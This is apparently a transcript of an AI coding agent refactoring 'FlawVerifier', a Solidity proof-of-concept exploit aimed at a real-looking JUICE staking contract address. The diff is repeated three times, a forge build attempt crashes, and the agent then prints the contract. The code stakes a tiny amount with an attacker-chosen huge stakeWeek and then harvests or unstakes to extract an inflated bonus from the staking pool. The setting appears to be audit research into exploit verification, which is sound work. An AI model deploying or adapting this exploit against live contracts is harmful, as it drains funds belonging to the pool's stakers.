+     uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+     uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+-    uint256 internal constant MAX_STAKE_WEEKS = 1e30;
++    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;
+ 
+     uint256 internal baselineBalance;
+-    uint256 internal trackedStakeIndex;
+-    uint256 internal chosenStakeWeeks;
++    uint256 internal trackedStakeCount;
++    uint256 internal trackedStakeEndTime;
+     bool internal baselineSet;
+-    bool internal stakePlaced;
++    bool internal stakeOpened;
+ 
+     error StakingNotStarted(uint256 stakingStartTime);
+     error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+@@ -54,8 +54,8 @@
+     constructor() {}
+ 
+     function executeOnOpportunity() public {
+-        if (!stakePlaced) {
+-            _openExploitPosition(IERC20Minimal(JUICE));
++        if (!stakeOpened) {
++            _openExploitPosition();
+             return;
+         }
+ 
+@@ -79,7 +79,7 @@
+         return currentBalance - baselineBalance;
+     }
+ 
+-    function _openExploitPosition(IERC20Minimal juice) internal {
++    function _openExploitPosition() internal {
+         uint256 stakingStart = STAKING.stakingStartTime();
+         if (stakingStart == 0) {
+             revert StakingNotStarted(stakingStart);
+@@ -90,11 +90,12 @@
+             revert StakingClosed(stakingEnd, block.timestamp);
+         }
+ 
+-        uint256 available = juice.balanceOf(address(this));
+-        if (available == 0) {
+-            // Attempt strategy for this run is direct_or_existing_balance_first.
+-            // This verifier therefore requires pre-existing JUICE on the verifier itself
+-            // unless the harness supplies it through realistic public actions outside this contract.
++        IERC20Minimal juice = IERC20Minimal(JUICE);
++        uint256 verifierHeldJuice = juice.balanceOf(address(this));
++        if (verifierHeldJuice == 0) {
++            // This attempt must prefer direct execution from verifier-held assets.
++            // If the harness wants to fund this verifier, it must do so through realistic
++            // public on-chain transfers outside this contract rather than balance injection.
+             revert NoVerifierHeldJuice();
+         }
+ 
+@@ -103,20 +104,33 @@
+             revert RewardEmissionInactive();
+         }
+ 
+-        uint256 currentStaked = STAKING.JuiceStaked();
+-        uint256 amount = _chooseStakeAmount(available, currentStaked, rewardRate);
+-        uint256 poolBalance = juice.balanceOf(address(STAKING));
+-        chosenStakeWeeks = _chooseStakeWeeks(amount, currentStaked, rewardRate, poolBalance);
++        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, STAKING.JuiceStaked(), rewardRate);
++        uint256 hugeStakeWeek = _chooseHugeStakeWeek(
++            tinyAmount,
++            STAKING.JuiceStaked(),
++            rewardRate,
++            juice.balanceOf(address(STAKING))
++        );
+ 
+-        baselineBalance = available;
++        baselineBalance = verifierHeldJuice;
+         baselineSet = true;
+-        trackedStakeIndex = STAKING.stakingCount(address(this));
+-        require(juice.approve(address(STAKING), amount), "approve failed");
+-        STAKING.stake(amount, chosenStakeWeeks);
+-        stakePlaced = true;
++
++        trackedStakeCount = STAKING.stakingCount(address(this));
++
++        require(juice.approve(address(STAKING), tinyAmount), "approve failed");
++
++        // Path 1: attacker calls stake(tinyAmount, hugeStakeWeek) while staking is open.
++        // The exploit relies on the vulnerable contract storing the attacker-chosen
++        // hugeStakeWeek without any upper bound or normalization.
++        STAKING.stake(tinyAmount, hugeStakeWeek);
++
++        (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
++        stakeOpened = true;
+     }
+ 
+     function _realizeExploitProfit() internal {
++        uint256 stakeCount = trackedStakeCount;
++
+         (
+             uint256 stakedAmount,
+             ,
+@@ -124,64 +138,65 @@
+             ,
+             ,
+             uint256 unstakeStatus
+-        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);
++        ) = STAKING.mapStakingInfo(address(this), stakeCount);
+ 
+         if (stakedAmount == 0 || unstakeStatus != 0) {
+             revert StakeAlreadyExited();
+         }
+ 
+-        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
++        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), stakeCount);
+         if (pending == 0) {
+-            // The hypothesis requires a later reward accrual after the oversized-week stake is opened.
+-            // If this is still zero, the exploit path has not yet reached the "nonzero base reward accrues" stage.
++            // Path 2 requires that some base reward has accrued first. Until then, there is
++            // nothing for the unbounded stakingWeek multiplier to amplify.
+             revert RewardNotAccruedYet(pending, bonus);
+         }
+ 
+-        if (block.timestamp >= endTime) {
+-            STAKING.unstake(trackedStakeIndex);
++        // Path 3: after nonzero pending accrues, realize the oversized bonus via harvest(stakeCount)
++        // or, if the position has matured, via unstake(stakeCount). Both code paths apply the same
++        // unbounded bonus formula in the target contract.
++        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
++            STAKING.unstake(stakeCount);
+         } else {
+-            STAKING.harvest(trackedStakeIndex);
++            STAKING.harvest(stakeCount);
+         }
+     }
+ 
+-    function _chooseStakeAmount(
+-        uint256 available,
+-        uint256 currentStaked,
++    function _chooseTinyAmount(
++        uint256 verifierHeldJuice,
++        uint256 currentTotalStaked,
+         uint256 rewardRate
+-    ) internal pure returns (uint256) {
+-        if (currentStaked == 0) {
+-            return 1;
++    ) internal pure returns (uint256 tinyAmount) {
++        if (currentTotalStaked == 0) {
++            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
+         }
+ 
+         uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+         if (divisor == 0) {
+-            return available;
++            return verifierHeldJuice;
+         }
+ 
+-        uint256 amount = currentStaked / divisor;
+-        if (currentStaked % divisor != 0) {
+-            amount += 1;
++        tinyAmount = currentTotalStaked / divisor;
++        if (currentTotalStaked % divisor != 0) {
++            tinyAmount += 1;
+         }
+ 
+-        if (amount == 0) {
+-            amount = 1;
++        if (tinyAmount == 0) {
++            tinyAmount = 1;
+         }
+ 
+-        if (amount > available) {
+-            amount = available;
++        if (tinyAmount > verifierHeldJuice) {
++            tinyAmount = verifierHeldJuice;
+         }
+-
+-        return amount;
+     }
+ 
+-    function _chooseStakeWeeks(
+-        uint256 amount,
+-        uint256 currentStaked,
++    function _chooseHugeStakeWeek(
++        uint256 tinyAmount,
++        uint256 currentTotalStaked,
+         uint256 rewardRate,
+         uint256 poolBalance
+-    ) internal pure returns (uint256) {
++    ) internal pure returns (uint256 hugeStakeWeek) {
+         uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+-        expectedPending = (expectedPending * amount) / (currentStaked + amount);
++        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
+         if (expectedPending == 0) {
+             expectedPending = 1;
+         }
+@@ -191,14 +206,15 @@
+             return 2;
+         }
+ 
+-        uint256 bonusBudget = desiredPayout - expectedPending;
+-        uint256 stakeWeeks = ((bonusBudget * 100) / (expectedPending * 9)) + 1;
+-        if (stakeWeeks < 2) {
+-            stakeWeeks = 2;
++        uint256 bonusTarget = desiredPayout - expectedPending;
++        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;
++
++        if (hugeStakeWeek < 2) {
++            hugeStakeWeek = 2;
+         }
+-        if (stakeWeeks > MAX_STAKE_WEEKS) {
+-            stakeWeeks = MAX_STAKE_WEEKS;
++
++        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
++            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
+         }
+-        return stakeWeeks;
+     }
+ }
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 97325b34a7024badede17a5079c5b9f6eaac6685..f2a53abb5e9b3c83b88de640cc495cfd6dc806e6
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.20;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Minimal {
+     function balanceOf(address account) external view returns (uint256);
+@@ -36,13 +36,13 @@
+ 
+     uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+     uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+-    uint256 internal constant MAX_STAKE_WEEKS = 1e30;
++    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;
+ 
+     uint256 internal baselineBalance;
+-    uint256 internal trackedStakeIndex;
+-    uint256 internal chosenStakeWeeks;
++    uint256 internal trackedStakeCount;
++    uint256 internal trackedStakeEndTime;
+     bool internal baselineSet;
+-    bool internal stakePlaced;
++    bool internal stakeOpened;
+ 
+     error StakingNotStarted(uint256 stakingStartTime);
+     error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+@@ -54,8 +54,8 @@
+     constructor() {}
+ 
+     function executeOnOpportunity() public {
+-        if (!stakePlaced) {
+-            _openExploitPosition(IERC20Minimal(JUICE));
++        if (!stakeOpened) {
++            _openExploitPosition();
+             return;
+         }
+ 
+@@ -79,7 +79,7 @@
+         return currentBalance - baselineBalance;
+     }
+ 
+-    function _openExploitPosition(IERC20Minimal juice) internal {
++    function _openExploitPosition() internal {
+         uint256 stakingStart = STAKING.stakingStartTime();
+         if (stakingStart == 0) {
+             revert StakingNotStarted(stakingStart);
+@@ -90,11 +90,12 @@
+             revert StakingClosed(stakingEnd, block.timestamp);
+         }
+ 
+-        uint256 available = juice.balanceOf(address(this));
+-        if (available == 0) {
+-            // Attempt strategy for this run is direct_or_existing_balance_first.
+-            // This verifier therefore requires pre-existing JUICE on the verifier itself
+-            // unless the harness supplies it through realistic public actions outside this contract.
++        IERC20Minimal juice = IERC20Minimal(JUICE);
++        uint256 verifierHeldJuice = juice.balanceOf(address(this));
++        if (verifierHeldJuice == 0) {
++            // This attempt must prefer direct execution from verifier-held assets.
++            // If the harness wants to fund this verifier, it must do so through realistic
++            // public on-chain transfers outside this contract rather than balance injection.
+             revert NoVerifierHeldJuice();
+         }
+ 
+@@ -103,20 +104,33 @@
+             revert RewardEmissionInactive();
+         }
+ 
+-        uint256 currentStaked = STAKING.JuiceStaked();
+-        uint256 amount = _chooseStakeAmount(available, currentStaked, rewardRate);
+-        uint256 poolBalance = juice.balanceOf(address(STAKING));
+-        chosenStakeWeeks = _chooseStakeWeeks(amount, currentStaked, rewardRate, poolBalance);
++        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, STAKING.JuiceStaked(), rewardRate);
++        uint256 hugeStakeWeek = _chooseHugeStakeWeek(
++            tinyAmount,
++            STAKING.JuiceStaked(),
++            rewardRate,
++            juice.balanceOf(address(STAKING))
++        );
+ 
+-        baselineBalance = available;
++        baselineBalance = verifierHeldJuice;
+         baselineSet = true;
+-        trackedStakeIndex = STAKING.stakingCount(address(this));
+-        require(juice.approve(address(STAKING), amount), "approve failed");
+-        STAKING.stake(amount, chosenStakeWeeks);
+-        stakePlaced = true;
++
++        trackedStakeCount = STAKING.stakingCount(address(this));
++
++        require(juice.approve(address(STAKING), tinyAmount), "approve failed");
++
++        // Path 1: attacker calls stake(tinyAmount, hugeStakeWeek) while staking is open.
++        // The exploit relies on the vulnerable contract storing the attacker-chosen
++        // hugeStakeWeek without any upper bound or normalization.
++        STAKING.stake(tinyAmount, hugeStakeWeek);
++
++        (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
++        stakeOpened = true;
+     }
+ 
+     function _realizeExploitProfit() internal {
++        uint256 stakeCount = trackedStakeCount;
++
+         (
+             uint256 stakedAmount,
+             ,
+@@ -124,64 +138,65 @@
+             ,
+             ,
+             uint256 unstakeStatus
+-        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);
++        ) = STAKING.mapStakingInfo(address(this), stakeCount);
+ 
+         if (stakedAmount == 0 || unstakeStatus != 0) {
+             revert StakeAlreadyExited();
+         }
+ 
+-        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
++        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), stakeCount);
+         if (pending == 0) {
+-            // The hypothesis requires a later reward accrual after the oversized-week stake is opened.
+-            // If this is still zero, the exploit path has not yet reached the "nonzero base reward accrues" stage.
++            // Path 2 requires that some base reward has accrued first. Until then, there is
++            // nothing for the unbounded stakingWeek multiplier to amplify.
+             revert RewardNotAccruedYet(pending, bonus);
+         }
+ 
+-        if (block.timestamp >= endTime) {
+-            STAKING.unstake(trackedStakeIndex);
++        // Path 3: after nonzero pending accrues, realize the oversized bonus via harvest(stakeCount)
++        // or, if the position has matured, via unstake(stakeCount). Both code paths apply the same
++        // unbounded bonus formula in the target contract.
++        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
++            STAKING.unstake(stakeCount);
+         } else {
+-            STAKING.harvest(trackedStakeIndex);
++            STAKING.harvest(stakeCount);
+         }
+     }
+ 
+-    function _chooseStakeAmount(
+-        uint256 available,
+-        uint256 currentStaked,
++    function _chooseTinyAmount(
++        uint256 verifierHeldJuice,
++        uint256 currentTotalStaked,
+         uint256 rewardRate
+-    ) internal pure returns (uint256) {
+-        if (currentStaked == 0) {
+-            return 1;
++    ) internal pure returns (uint256 tinyAmount) {
++        if (currentTotalStaked == 0) {
++            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
+         }
+ 
+         uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+         if (divisor == 0) {
+-            return available;
++            return verifierHeldJuice;
+         }
+ 
+-        uint256 amount = currentStaked / divisor;
+-        if (currentStaked % divisor != 0) {
+-            amount += 1;
++        tinyAmount = currentTotalStaked / divisor;
++        if (currentTotalStaked % divisor != 0) {
++            tinyAmount += 1;
+         }
+ 
+-        if (amount == 0) {
+-            amount = 1;
++        if (tinyAmount == 0) {
++            tinyAmount = 1;
+         }
+ 
+-        if (amount > available) {
+-            amount = available;
++        if (tinyAmount > verifierHeldJuice) {
++            tinyAmount = verifierHeldJuice;
+         }
+-
+-        return amount;
+     }
+ 
+-    function _chooseStakeWeeks(
+-        uint256 amount,
+-        uint256 currentStaked,
++    function _chooseHugeStakeWeek(
++        uint256 tinyAmount,
++        uint256 currentTotalStaked,
+         uint256 rewardRate,
+         uint256 poolBalance
+-    ) internal pure returns (uint256) {
++    ) internal pure returns (uint256 hugeStakeWeek) {
+         uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+-        expectedPending = (expectedPending * amount) / (currentStaked + amount);
++        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
+         if (expectedPending == 0) {
+             expectedPending = 1;
+         }
+@@ -191,14 +206,15 @@
+             return 2;
+         }
+ 
+-        uint256 bonusBudget = desiredPayout - expectedPending;
+-        uint256 stakeWeeks = ((bonusBudget * 100) / (expectedPending * 9)) + 1;
+-        if (stakeWeeks < 2) {
+-            stakeWeeks = 2;
++        uint256 bonusTarget = desiredPayout - expectedPending;
++        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;
++
++        if (hugeStakeWeek < 2) {
++            hugeStakeWeek = 2;
+         }
+-        if (stakeWeeks > MAX_STAKE_WEEKS) {
+-            stakeWeeks = MAX_STAKE_WEEKS;
++
++        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
++            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
+         }
+-        return stakeWeeks;
+     }
+ }
+
+codex
+The verifier has been rewritten. I’m compiling it locally now to catch any syntax/interface regressions before I return the final Solidity.
+exec
+/bin/bash -lc 'forge build' in /Users/zhanglongqin/AuditHoundV2/cases/juice/src/onchain_auto
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 97325b34a7024badede17a5079c5b9f6eaac6685..f2a53abb5e9b3c83b88de640cc495cfd6dc806e6
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.20;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Minimal {
+     function balanceOf(address account) external view returns (uint256);
+@@ -36,13 +36,13 @@
+ 
+     uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+     uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+-    uint256 internal constant MAX_STAKE_WEEKS = 1e30;
++    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;
+ 
+     uint256 internal baselineBalance;
+-    uint256 internal trackedStakeIndex;
+-    uint256 internal chosenStakeWeeks;
++    uint256 internal trackedStakeCount;
++    uint256 internal trackedStakeEndTime;
+     bool internal baselineSet;
+-    bool internal stakePlaced;
++    bool internal stakeOpened;
+ 
+     error StakingNotStarted(uint256 stakingStartTime);
+     error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+@@ -54,8 +54,8 @@
+     constructor() {}
+ 
+     function executeOnOpportunity() public {
+-        if (!stakePlaced) {
+-            _openExploitPosition(IERC20Minimal(JUICE));
++        if (!stakeOpened) {
++            _openExploitPosition();
+             return;
+         }
+ 
+@@ -79,7 +79,7 @@
+         return currentBalance - baselineBalance;
+     }
+ 
+-    function _openExploitPosition(IERC20Minimal juice) internal {
++    function _openExploitPosition() internal {
+         uint256 stakingStart = STAKING.stakingStartTime();
+         if (stakingStart == 0) {
+             revert StakingNotStarted(stakingStart);
+@@ -90,11 +90,12 @@
+             revert StakingClosed(stakingEnd, block.timestamp);
+         }
+ 
+-        uint256 available = juice.balanceOf(address(this));
+-        if (available == 0) {
+-            // Attempt strategy for this run is direct_or_existing_balance_first.
+-            // This verifier therefore requires pre-existing JUICE on the verifier itself
+-            // unless the harness supplies it through realistic public actions outside this contract.
++        IERC20Minimal juice = IERC20Minimal(JUICE);
++        uint256 verifierHeldJuice = juice.balanceOf(address(this));
++        if (verifierHeldJuice == 0) {
++            // This attempt must prefer direct execution from verifier-held assets.
++            // If the harness wants to fund this verifier, it must do so through realistic
++            // public on-chain transfers outside this contract rather than balance injection.
+             revert NoVerifierHeldJuice();
+         }
+ 
+@@ -103,20 +104,33 @@
+             revert RewardEmissionInactive();
+         }
+ 
+-        uint256 currentStaked = STAKING.JuiceStaked();
+-        uint256 amount = _chooseStakeAmount(available, currentStaked, rewardRate);
+-        uint256 poolBalance = juice.balanceOf(address(STAKING));
+-        chosenStakeWeeks = _chooseStakeWeeks(amount, currentStaked, rewardRate, poolBalance);
++        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, STAKING.JuiceStaked(), rewardRate);
++        uint256 hugeStakeWeek = _chooseHugeStakeWeek(
++            tinyAmount,
++            STAKING.JuiceStaked(),
++            rewardRate,
++            juice.balanceOf(address(STAKING))
++        );
+ 
+-        baselineBalance = available;
++        baselineBalance = verifierHeldJuice;
+         baselineSet = true;
+-        trackedStakeIndex = STAKING.stakingCount(address(this));
+-        require(juice.approve(address(STAKING), amount), "approve failed");
+-        STAKING.stake(amount, chosenStakeWeeks);
+-        stakePlaced = true;
++
++        trackedStakeCount = STAKING.stakingCount(address(this));
++
++        require(juice.approve(address(STAKING), tinyAmount), "approve failed");
++
++        // Path 1: attacker calls stake(tinyAmount, hugeStakeWeek) while staking is open.
++        // The exploit relies on the vulnerable contract storing the attacker-chosen
++        // hugeStakeWeek without any upper bound or normalization.
++        STAKING.stake(tinyAmount, hugeStakeWeek);
++
++        (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
++        stakeOpened = true;
+     }
+ 
+     function _realizeExploitProfit() internal {
++        uint256 stakeCount = trackedStakeCount;
++
+         (
+             uint256 stakedAmount,
+             ,
+@@ -124,64 +138,65 @@
+             ,
+             ,
+             uint256 unstakeStatus
+-        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);
++        ) = STAKING.mapStakingInfo(address(this), stakeCount);
+ 
+         if (stakedAmount == 0 || unstakeStatus != 0) {
+             revert StakeAlreadyExited();
+         }
+ 
+-        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
++        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), stakeCount);
+         if (pending == 0) {
+-            // The hypothesis requires a later reward accrual after the oversized-week stake is opened.
+-            // If this is still zero, the exploit path has not yet reached the "nonzero base reward accrues" stage.
++            // Path 2 requires that some base reward has accrued first. Until then, there is
++            // nothing for the unbounded stakingWeek multiplier to amplify.
+             revert RewardNotAccruedYet(pending, bonus);
+         }
+ 
+-        if (block.timestamp >= endTime) {
+-            STAKING.unstake(trackedStakeIndex);
++        // Path 3: after nonzero pending accrues, realize the oversized bonus via harvest(stakeCount)
++        // or, if the position has matured, via unstake(stakeCount). Both code paths apply the same
++        // unbounded bonus formula in the target contract.
++        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
++            STAKING.unstake(stakeCount);
+         } else {
+-            STAKING.harvest(trackedStakeIndex);
++            STAKING.harvest(stakeCount);
+         }
+     }
+ 
+-    function _chooseStakeAmount(
+-        uint256 available,
+-        uint256 currentStaked,
++    function _chooseTinyAmount(
++        uint256 verifierHeldJuice,
++        uint256 currentTotalStaked,
+         uint256 rewardRate
+-    ) internal pure returns (uint256) {
+-        if (currentStaked == 0) {
+-            return 1;
++    ) internal pure returns (uint256 tinyAmount) {
++        if (currentTotalStaked == 0) {
++            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
+         }
+ 
+         uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+         if (divisor == 0) {
+-            return available;
++            return verifierHeldJuice;
+         }
+ 
+-        uint256 amount = currentStaked / divisor;
+-        if (currentStaked % divisor != 0) {
+-            amount += 1;
++        tinyAmount = currentTotalStaked / divisor;
++        if (currentTotalStaked % divisor != 0) {
++            tinyAmount += 1;
+         }
+ 
+-        if (amount == 0) {
+-            amount = 1;
++        if (tinyAmount == 0) {
++            tinyAmount = 1;
+         }
+ 
+-        if (amount > available) {
+-            amount = available;
++        if (tinyAmount > verifierHeldJuice) {
++            tinyAmount = verifierHeldJuice;
+         }
+-
+-        return amount;
+     }
+ 
+-    function _chooseStakeWeeks(
+-        uint256 amount,
+-        uint256 currentStaked,
++    function _chooseHugeStakeWeek(
++        uint256 tinyAmount,
++        uint256 currentTotalStaked,
+         uint256 rewardRate,
+         uint256 poolBalance
+-    ) internal pure returns (uint256) {
++    ) internal pure returns (uint256 hugeStakeWeek) {
+         uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+-        expectedPending = (expectedPending * amount) / (currentStaked + amount);
++        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
+         if (expectedPending == 0) {
+             expectedPending = 1;
+         }
+@@ -191,14 +206,15 @@
+             return 2;
+         }
+ 
+-        uint256 bonusBudget = desiredPayout - expectedPending;
+-        uint256 stakeWeeks = ((bonusBudget * 100) / (expectedPending * 9)) + 1;
+-        if (stakeWeeks < 2) {
+-            stakeWeeks = 2;
++        uint256 bonusTarget = desiredPayout - expectedPending;
++        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;
++
++        if (hugeStakeWeek < 2) {
++            hugeStakeWeek = 2;
+         }
+-        if (stakeWeeks > MAX_STAKE_WEEKS) {
+-            stakeWeeks = MAX_STAKE_WEEKS;
++
++        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
++            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
+         }
+-        return stakeWeeks;
+     }
+ }
+
+ exited -1 in 827ms:
+[31mThe application panicked (crashed).[0m
+Message:  [36mAttempted to create a NULL object.[0m
+Location: [35m/Users/runner/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/system-configuration-0.6.1/src/dynamic_store.rs[0m:[35m154[0m
+
+This is a bug. Consider reporting it at https://github.com/foundry-rs/foundry
+
+  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ BACKTRACE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [96m                              ⋮ 7 frames hidden ⋮                               [0m
+   8: [91msystem_configuration::dynamic_store::SCDynamicStoreBuilder<T>::build[0m[90m::hb6b7398ab9127160[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+   9: [91mhyper_util::client::proxy::matcher::mac::with_system[0m[90m::h3338c8c0d2740d7c[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  10: [91mhyper_util::client::proxy::matcher::Builder::from_system[0m[90m::h3a3f53683d31d1e3[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  11: [91mhyper_util::client::proxy::matcher::Matcher::from_system[0m[90m::ha79c82c47b7638ea[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  12: [91mreqwest::async_impl::client::ClientBuilder::build[0m[90m::hc8894a541e69260a[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  13: [91mreqwest::get::{{closure}}[0m[90m::hf2c531c5845e22a4[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  14: [91msvm::install::install::{{closure}}[0m[90m::h4af4aca7a1c58942[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  15: [91mtokio::runtime::park::CachedParkThread::block_on[0m[90m::hf9923e8007f07d0a[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  16: [91mfoundry_compilers::compilers::solc::compiler::Solc::blocking_install[0m[90m::hbad2795c02cfbfcb[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  17: [91mfoundry_config::Config::create_project[0m[90m::h2c5d3f0e325f4e8c[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  18: [91mforge::cmd::build::BuildArgs::run[0m[90m::h927cf2636085060b[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  19: [91mforge::args::run_command[0m[90m::h43e8feb4e11b5a49[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  20: [91mforge::args::run[0m[90m::h745816d1d162b872[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  21: [91mforge::main[0m[90m::h36e059ba98478569[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  22: [32mstd::sys::backtrace::__rust_begin_short_backtrace[0m[90m::hb748227c2e52dc50[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  23: [32m_main[0m[90m<unknown>[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+
+Run with COLORBT_SHOW_HIDDEN=1 environment variable to disable frame filtering.
+Run with RUST_BACKTRACE=full to include source snippets.
+
+codex
+`forge build` is crashing in this environment before compilation due to a local Foundry/SVM proxy bug, not a Solidity parse error. I’m doing a quick static pass on the final file and then I’ll return the complete contract source directly.
+exec
+/bin/bash -lc "sed -n '1,240p' src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/juice/src/onchain_auto
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IJuiceStaking {
+    function Juice() external view returns (address);
+    function JuiceStaked() external view returns (uint256);
+    function rewardPerSecond() external view returns (uint256);
+    function stake(uint256 amount, uint256 stakeWeek) external;
+    function harvest(uint256 stakeCount) external;
+    function unstake(uint256 stakeCount) external;
+    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
+    function stakingStartTime() external view returns (uint256);
+    function stakingEndTime() external view returns (uint256);
+    function stakingCount(address staker) external view returns (uint256);
+    function mapStakingInfo(address staker, uint256 stakeCount)
+        external
+        view
+        returns (
+            uint256 stakedAmount,
+            uint256 startTime,
+            uint256 endTime,
+            uint256 stakingWeek,
+            uint256 rewardDebt,
+            uint256 unstakeStatus
+        );
+}
+
+contract FlawVerifier {
+    IJuiceStaking internal constant STAKING = IJuiceStaking(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
+    address internal constant JUICE = 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae;
+
+    uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+    uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;
+
+    uint256 internal baselineBalance;
+    uint256 internal trackedStakeCount;
+    uint256 internal trackedStakeEndTime;
+    bool internal baselineSet;
+    bool internal stakeOpened;
+
+    error StakingNotStarted(uint256 stakingStartTime);
+    error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+    error NoVerifierHeldJuice();
+    error RewardEmissionInactive();
+    error StakeAlreadyExited();
+    error RewardNotAccruedYet(uint256 pending, uint256 bonus);
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        if (!stakeOpened) {
+            _openExploitPosition();
+            return;
+        }
+
+        _realizeExploitProfit();
+    }
+
+    function profitToken() external pure returns (address) {
+        return JUICE;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        if (!baselineSet) {
+            return 0;
+        }
+
+        uint256 currentBalance = IERC20Minimal(JUICE).balanceOf(address(this));
+        if (currentBalance <= baselineBalance) {
+            return 0;
+        }
+
+        return currentBalance - baselineBalance;
+    }
+
+    function _openExploitPosition() internal {
+        uint256 stakingStart = STAKING.stakingStartTime();
+        if (stakingStart == 0) {
+            revert StakingNotStarted(stakingStart);
+        }
+
+        uint256 stakingEnd = STAKING.stakingEndTime();
+        if (stakingEnd <= block.timestamp) {
+            revert StakingClosed(stakingEnd, block.timestamp);
+        }
+
+        IERC20Minimal juice = IERC20Minimal(JUICE);
+        uint256 verifierHeldJuice = juice.balanceOf(address(this));
+        if (verifierHeldJuice == 0) {
+            // This attempt must prefer direct execution from verifier-held assets.
+            // If the harness wants to fund this verifier, it must do so through realistic
+            // public on-chain transfers outside this contract rather than balance injection.
+            revert NoVerifierHeldJuice();
+        }
+
